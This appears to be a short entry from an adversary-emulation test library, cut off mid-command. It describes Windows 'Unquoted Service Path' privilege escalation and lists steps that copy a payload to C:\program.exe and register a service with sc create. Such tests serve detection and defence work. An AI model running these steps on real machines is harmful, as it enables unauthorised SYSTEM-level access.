Test Description: When a service is created whose executable path contains spaces and isnâ€™t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\\\ exists, C:\\\\program.exe will be executed instead of test.exe in C:\\\\Program Files\\\\subfolder\\\\test.exe.. Command/Steps: copy \\\"#{service_executable}\\\" \\\"C:\\\\Program Files\\\\windows_service.exe\\\"\ncopy \\\"#{service_executable}\\\" \\\"C:\\\\program.exe\\\"\nsc create \\\"Example Service\\\" binpath=..."
